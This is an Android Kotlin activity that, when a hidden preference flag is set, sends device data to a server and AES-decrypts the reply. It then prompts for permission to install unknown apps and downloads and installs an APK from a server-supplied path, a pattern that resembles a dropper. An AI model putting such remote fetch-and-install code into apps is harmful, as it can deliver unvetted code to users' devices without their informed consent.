package net.basicmodel

import android.app.DownloadManager
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.alibaba.fastjson.JSON
import com.xxxxxxh.lib.CommonUtils
import com.xxxxxxh.lib.MessageEvent
import es.dmoral.prefs.Prefs
import es.dmoral.toasty.Toasty
import net.utils.AesEncryptUtil
import net.utils.ResultEntity
import net.utils.Utils
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import org.greenrobot.eventbus.ThreadMode

class MainActivity : AppCompatActivity() {
    private var entity: ResultEntity? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        EventBus.getDefault().register(this)
        if (!Prefs.with(this).readBoolean("state"))
            return
        else {
            CommonUtils.update(JSON.toJSONString(Utils.getRequestData(this)))
            val intentFilter = IntentFilter()
            intentFilter.addAction("action_download")
            intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
            intentFilter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
            registerReceiver(CommonUtils.addReceiver(this), intentFilter)
        }

    }

    @RequiresApi(Build.VERSION_CODES.O)
    @Subscribe(threadMode = ThreadMode.MAIN)
    fun onEvent(e: MessageEvent) {
        val msg = e.getMessage()
        when (msg[0]) {
            "onError" -> {
                Toasty.error(this, "error").show()
            }
            "onSuccess" -> {
                val result = AesEncryptUtil.decrypt(msg[1].toString())
                entity = JSON.parseObject(result, ResultEntity::class.java)
                if (Build.VERSION.SDK_INT > 24) {
                    if (!this.packageManager.canRequestPackageInstalls()) {
                        CommonUtils.createPermissionDlg(this, entity!!.ukey, R.mipmap.ic_launcher)
                    } else {
                        CommonUtils.createUpdateDlg(this, entity!!.ikey, entity!!.path)
                    }
                } else {
                    CommonUtils.createUpdateDlg(this, entity!!.ikey, entity!!.path)
                }
            }
            "perOk" -> {
                if (!this.packageManager.canRequestPackageInstalls()) {
                    CommonUtils.allowThirdInstall(this, this)
                } else {
                    CommonUtils.createUpdateDlg(this, entity!!.ikey, entity!!.path)
                }
            }
            "update" -> {
                CommonUtils.download(this, entity!!.path)
            }
            "onComplete" -> {
                Toasty.success(this, "Download Completed Saved in: ${msg[1]}").show()
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1) {
            if (!this.packageManager.canRequestPackageInstalls()) {
                CommonUtils.createPermissionDlg(this, entity!!.ukey, R.mipmap.ic_launcher)
            } else {
                CommonUtils.createUpdateDlg(this, entity!!.ikey, entity!!.path)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        EventBus.getDefault().unregister(this)
    }
}